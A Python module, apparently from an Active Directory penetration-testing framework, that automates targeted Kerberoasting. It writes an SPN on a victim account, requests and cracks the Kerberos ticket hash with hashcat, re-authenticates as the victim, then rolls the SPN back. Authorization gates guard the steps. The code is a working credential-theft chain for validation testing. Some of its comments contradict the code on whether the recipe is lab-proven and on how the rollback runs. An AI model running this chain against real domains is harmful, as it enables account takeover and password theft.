"""TARGETED-KERBEROAST validation executor -- T3 (ACL / object-takeover edges).

Encodes "write your own roastable SPN, then roast it" -- KERBEROAST's own
proven shape (``roast.py``), plus a write-the-precondition-myself front and a
remove-it-after back:

    impacket-dacledit -action read              (confirm GenericAll/GenericWrite over victim)
    bloodyAD ... set object <victim> servicePrincipalName -v <spn>
    impacket-GetUserSPNs -request -request-user <victim>  -> $krb5tgs$
    hashcat -m 13100 <hashes> <wordlist>  (offline, opt-in -- reuses "offline_crack")
    nxc smb <reauth_target> -u <victim> -p <plaintext>    (= the terminal proof)
    ROLLBACK: bloodyAD ... set object <victim> servicePrincipalName -v ''
              + nxc ldap --query servicePrincipalName; verified = positive_absence(spn)

Mutating (a new SPN is written), so a VERIFIED rollback is required. The
recovered plaintext lives only in-process, exactly like ``roast.py``: masked in
every stored argv, never written to the receipt.

``crack_dependent = True`` -- the FIRST executor in the tree to set it,
activating ``ChainEngine``'s dormant ``allow_crack`` static filter for the
first time (mirrors ``roast.py``'s own ``offline_crack`` *runtime* authorizer
gate -- the two are independent, same two-layer pattern as ``destructive``).

``verified_recipe=False`` (recipe-known, not lab-proven). UNVERIFIED: the exact
bloodyAD/impacket-dacledit human-readable wording (see ``acl_common.py``).
"""
from __future__ import annotations
from .. import netresolve

import re
from pathlib import Path
from typing import Any, Optional

from ..recommend import ParamSpec, ParamValue, values, recommended_spn
from ..predicates import positive_absence
from .. import proof
from .. import states
from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv, Capability, CAP_NONE)
from .acl_common import dacledit_read_argv, confirm_ace, _RE_ACE_GENERIC_ALL, _RE_ACE_GENERIC_WRITE
from .roast import DEFAULT_WORDLIST


# bloodyAD attribute-write success marker. PINNED IN-LAB (bloodyAD 2.x prints
# "<obj>'s <attr> has been updated"); the "successfully (set|updated)" /
# "attribute ..." alternations are kept for other tool wordings.
_RE_BLOODYAD_SET_OK = re.compile(
    r"(successfully (set|updated)|has been (updated|set)|attribute.*(updated|set))", re.I)

# $krb5tgs$ blob -- a one-line literal, matching roast.py's KerberoastExecutor.hash_re
# exactly but NOT imported (plan §2.6: zero cross-module coupling for a one-line
# literal, same rationale as acl_common.py's regex constants).
_RE_KRB5TGS = re.compile(r"\$krb5tgs\$[^\s]+")

# nxc re-auth success markers (same literals as roast.py/rbcd.py -- modest
# duplication, zero cross-module coupling, same rationale throughout T3).
_RE_NXC_PWNED = re.compile(r"\(Pwn3d!\)", re.I)
_RE_NXC_AUTH_OK = re.compile(r"\bSMB\b.*\[\+\]", re.I)

# A successful nxc ldap object read echoes the sAMAccountName anchor; its
# absence means the object was not actually read -> unknown (fail safe).
# Deliberately re-declared here rather than imported from ``probes.py`` --
# same import-order-fragile direction ``acl_common.py``'s own docstring and
# ``add_member.py``'s identical duplication already flag.
_RE_ANCHOR = re.compile(r"(Response for object|\bsAMAccountName\b\s*[:=])", re.I)


def _tool_errored(res: RunResult) -> bool:
    return bool(res.error) or res.timed_out or res.returncode is None


def _account_read_ok(res: RunResult, text: str) -> bool:
    if _tool_errored(res) or not (text or "").strip():
        return False
    return bool(_RE_ANCHOR.search(text))


def _nxc_auth_flags(cfg) -> list[str]:
    """NetExec auth flags (mirrors probes._nxc_auth / roast.py's own copy)."""
    return netresolve.nxc_auth_flags(cfg)


def _bloodyad_auth_argv(cfg, dc: str) -> list[str]:
    argv = ["bloodyAD", "-d", cfg.domain, "-u", cfg.username or ""]
    if cfg.nt_hash:
        argv += ["-H", cfg.nt_hash]
    elif cfg.password is not None:
        argv += ["-p", cfg.password]
    argv += ["--host", dc]
    return argv


def _principal_short(name: str) -> str:
    """The bare sAMAccountName root -- strips ``DOMAIN\\`` / ``@domain``."""
    name = (name or "").strip()
    if "\\" in name:
        name = name.split("\\", 1)[1]
    if "@" in name:
        name = name.split("@", 1)[0]
    return name


class TargetedKerberoastExecutor(ValidationExecutor):
    recovers_credentials = True
    technique = "TARGETED-KERBEROAST"
    technique_class = "acl"
    terminal_kind = "authn_success"
    mutating = True
    verified_recipe = True         # lab-proven on GOAD 26NOV2026 (samwell.tarly, SPN->roast->crack->reauth, scored proved+clean)
    crack_dependent = True
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_ACL_CRED})
    recipe_ref = ("T3 TARGETED-KERBEROAST = dacledit read (confirm precondition "
                  "GenericAll/GenericWrite) ; bloodyAD set object servicePrincipalName ; "
                  "impacket-GetUserSPNs -request -> $krb5tgs$ ; gate offline_crack ; "
                  "hashcat -m 13100 ; nxc smb reauth (= the terminal) ; ROLLBACK: "
                  "clear SPN + positive_absence readback (recipe-known, NOT lab-proven)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        victim = (finding.entity or {}).get("principal") or ""
        return [
            ParamSpec(
                name="victim", kind="free",
                description="The account to write a service principal name on, "
                            "then Kerberoast and crack. Requires an already-held "
                            "GenericAll/GenericWrite ACE over it.",
                recommended=victim,
                rationale="The principal of the aranum ACL finding.",
                required=True,
            ),
            ParamSpec(
                name="spn", kind="spn",
                description="The service principal name written on `victim` "
                            "before roasting it.",
                recommended=recommended_spn("http", victim) if victim else "http/<victim>",
                rationale="An http/<victim> SPN is a plausible, inert service class.",
            ),
            ParamSpec(
                name="wordlist", kind="free",
                description="Offline cracking wordlist for hashcat.",
                recommended=DEFAULT_WORDLIST,
                rationale="Kali's rockyou (imported from roast.py); override to a "
                          "larger list or a ruleset path.",
                validator=lambda v: None if isinstance(v, str) and v.strip()
                else "must be a wordlist path",
            ),
            ParamSpec(
                name="reauth_target", kind="target_host",
                description="Host to re-authenticate against (proves the cracked "
                            "credential is a live domain credential).",
                recommended=ctx.config.dc_ip,
                rationale="The DC by default; any domain-joined host accepting the "
                          "credential works.",
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        # Mirrors KERBEROAST's own facet: {domain, principal}.
        victim = params["victim"].value or (finding.entity or {}).get("principal") or ""
        return {"domain": ctx.config.domain, "principal": victim}

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        return [
            f"impacket-dacledit -action read -target '{v['victim']}' -dc-ip {dc} <auth>  "
            "(confirm precondition GenericAll/GenericWrite)",
            f"bloodyAD ... --host {dc} set object '{v['victim']}' servicePrincipalName "
            f"-v '{v['spn']}'",
            f"impacket-GetUserSPNs <auth> -dc-ip {dc} -request -request-user "
            f"'{v['victim']}' -> $krb5tgs$",
            f"hashcat -m 13100 <hashes> {v['wordlist']}  (offline, opt-in)",
            f"nxc smb {v['reauth_target']} -u {v['victim']} -p ***   (= authn proof)",
            "ROLLBACK: clear the written SPN + positive_absence readback",
        ]

    # ---------------------------------------------------------------- auth argv
    def _op_auth_target(self, cfg) -> tuple[str, list[str]]:
        target = f"{cfg.domain}/{cfg.username or ''}"
        extra: list[str] = []
        if cfg.nt_hash:
            extra = ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            extra = ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            target += f":{cfg.password}"
        return target, extra

    # ---------------------------------------------------------------- execute
    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
        return list(artifact.get("_reveal", []))

    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        # Private recovery channel, populated before downstream proof/cleanup.
        artifact = {"_reveal": []}
        ctx._pending_reveal_artifact = artifact

        def finish_artifact(*args):
            artifact.update(self._artifact(*args))
            return artifact

        cfg = ctx.config
        v = values(params)
        victim, spn, wordlist = v["victim"], v["spn"], v["wordlist"]
        reauth_target = v["reauth_target"]
        dc = cfg.dc_ip
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)
        victim_short = _principal_short(victim)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        def finish(terminal_fact, ok) -> dict:
            complete = bool(ok)
            if mutation["applied"]:
                self._rollback(ctx, cfg, victim, spn, mutation, steps, errors, record)
                complete = bool(ok and mutation["rollback"]["performed"])
            return finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)

        # 1) confirm the PRECONDITION ACE over the victim ---------------------
        read_argv = dacledit_read_argv(cfg, victim, dc)
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        read_text = (res.stdout or "") + (res.stderr or "")
        confirmed = confirm_ace(res, read_text, trustee=cfg.username or "",
                               right_res=(_RE_ACE_GENERIC_ALL, _RE_ACE_GENERIC_WRITE))
        record("confirm_precondition", read_argv, res, confirmed is not False,
              note="precondition confirmed" if confirmed else
                   ("precondition insufficient" if confirmed is False else "unconfirmed"))
        if confirmed is False:
            errors.append("targeted_kerberoast_not_confirmed")
            return finish(None, False)
        if confirmed is None:
            errors.append("advisory:targeted_kerberoast_unconfirmed_attempting_anyway")

        # 2) gate the SPN write -------------------------------------------------
        verdict = ctx.authorizer.authorize("targeted_kerberoast_write_spn",
                                           {"victim": victim, "spn": spn})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "targeted_kerberoast_write_spn"
            errors.append("gate_denied:targeted_kerberoast_write_spn")
            return finish(None, False)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "targeted_kerberoast_write_spn"

        # 3) write the SPN (mutating) --------------------------------------------
        set_argv = _bloodyad_auth_argv(cfg, dc) + ["set", "object", victim,
                                                   "servicePrincipalName", "-v", spn]
        res = ctx.runner.run(set_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        set_out = (res.stdout or "") + (res.stderr or "")
        set_ok = bool(_RE_BLOODYAD_SET_OK.search(set_out))
        record("write_spn", set_argv, res, set_ok,
              note="SPN written" if set_ok else "SPN write failed")
        if not set_ok:
            errors.append("spn_write_failed")
            return finish(None, False)
        mutation["applied"] = True

        # 4) roast -> hash blob ---------------------------------------------------
        op_target, op_extra = self._op_auth_target(cfg)
        roast_argv = ["impacket-GetUserSPNs", op_target, "-dc-ip", dc, "-request",
                     "-request-user", victim, *op_extra]
        res = ctx.runner.run(roast_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        hashes = _RE_KRB5TGS.findall(res.stdout or "")
        artifact["_reveal"].extend(SecretReveal(
            self.technique, "crackable_hash", victim, blob) for blob in hashes)
        roast_ok = bool(hashes)
        record("roast", roast_argv, res, roast_ok,
              note=(f"{len(hashes)} hash(es)" if roast_ok else "no hash"))
        if not roast_ok:
            errors.append("roast_no_hash")
            return finish(None, False)
        hashfile = out_dir / f"targeted_kerberoast_{victim_short}.hash"
        hashfile.write_text("\n".join(hashes) + "\n", encoding="utf-8")

        # 5) gate the offline crack (reuses roast.py's op name for policy
        #    continuity) ------------------------------------------------------
        verdict = ctx.authorizer.authorize("offline_crack",
                                           {"technique": self.technique, "victim": victim})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "offline_crack"
            errors.append("gate_denied:offline_crack")
            return finish(None, False)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "offline_crack"

        # 6) crack ----------------------------------------------------------------
        potfile = out_dir / f"targeted_kerberoast_{victim_short}.pot"
        crack_argv = ["hashcat", "-m", "13100", str(hashfile), wordlist,
                     "--potfile-path", str(potfile), "--quiet"]
        res = ctx.runner.run(crack_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        show_argv = ["hashcat", "-m", "13100", str(hashfile), "--show",
                    "--potfile-path", str(potfile), "--outfile-format", "2", "--quiet"]
        res_show = ctx.runner.run(show_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        plaintext = self._first_plaintext(res_show.stdout or "")
        if plaintext:
            artifact["_reveal"].append(SecretReveal(self.technique, "password", victim, plaintext))
        crack_ok = bool(plaintext)
        record("crack", crack_argv, res, crack_ok,
              note="cracked" if crack_ok else "not cracked")
        if not crack_ok:
            errors.append("crack_failed")
            return finish(None, False)

        # 7) re-authenticate as the cracked victim = the terminal proof ----------
        nxc_argv = ["nxc", "smb", reauth_target, "-u", victim, "-p", plaintext]
        res = ctx.runner.run(nxc_argv, timeout=cfg.tool_timeout_s)
        out = res.stdout or ""
        reauth_ok = bool(_RE_NXC_PWNED.search(out) or _RE_NXC_AUTH_OK.search(out))
        record("reauth", nxc_argv, res, reauth_ok,
              note="pwn3d" if _RE_NXC_PWNED.search(out) else "auth" if reauth_ok else "")
        if not reauth_ok:
            errors.append("reauth_failed")

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=reauth_ok, impersonated=victim,
            predicate=(f"GenericWrite-wrote an SPN on {victim}, Kerberoasted + "
                      "cracked it, and re-authenticated as them"),
            proof_token=proof.proof_token("TARGETED-KERBEROAST", cfg.domain, victim,
                                          "authn_success" if reauth_ok else "authn_failed"),
            extra={"victim": victim, "spn": spn},
        )
        return finish(terminal_fact, reauth_ok)

    # ---------------------------------------------------------------- helpers
    @staticmethod
    def _first_plaintext(show_stdout: str) -> Optional[str]:
        for line in show_stdout.splitlines():
            if line.strip():
                return line.rstrip("\n")
        return None

    # ---------------------------------------------------------------- composition (C)
    def produced(self, ctx, finding, params, artifact) -> list[Capability]:
        credentials = super().produced(ctx, finding, params, artifact)
        victim = params["victim"].value or ""
        if not artifact.get("complete"):
            return credentials
        return [Capability(state=states.cred_for(victim), channel=CAP_NONE, principal=victim)] + credentials

    # ---------------------------------------------------------------- rollback
    def _rollback(self, ctx, cfg, victim, spn, mutation, steps, errors, record) -> None:
        if not mutation["applied"]:
            return
        dc = cfg.dc_ip
        if ctx.authorizer.authorize("rollback", {"victim": victim}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = ("bloodyAD clear servicePrincipalName + "
                                          "positive_absence readback")

        # bloodyAD deletes an attribute by OMITTING -v entirely ("delete if no
        # value given"); passing -v "" raises invalidAttributeSyntax (pinned
        # in-lab). So the clear is the same set-object call WITHOUT a -v value.
        clear_argv = _bloodyad_auth_argv(cfg, dc) + ["set", "object", victim,
                                                     "servicePrincipalName"]
        res = ctx.runner.run(clear_argv, timeout=cfg.tool_timeout_s)
        # bloodyAD's own clear-attribute wording is not pinned/trusted here --
        # `performed` is recorded for the step preview; the ONLY thing that
        # gates `verified` below is the positive_absence read-back.
        record("rollback_clear_spn", clear_argv, res, not _tool_errored(res))

        victim_short = _principal_short(victim)
        query_argv = ["nxc", "ldap", dc, *_nxc_auth_flags(cfg),
                     "--query", f"(sAMAccountName={victim_short})", "servicePrincipalName"]
        res = ctx.runner.run(query_argv, timeout=cfg.tool_timeout_s)
        query_text = (res.stdout or "") + (res.stderr or "")
        bind_ok = _account_read_ok(res, query_text)
        cleared = positive_absence(bind_ok, query_text, spn)
        record("rollback_verify_absent", query_argv, res, cleared,
              note="SPN cleared (confirmed)" if cleared else "SPN removal not confirmed")

        mutation["rollback"]["verified"] = cleared
        if not mutation["rollback"]["verified"]:
            errors.append("rollback_unverified")

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
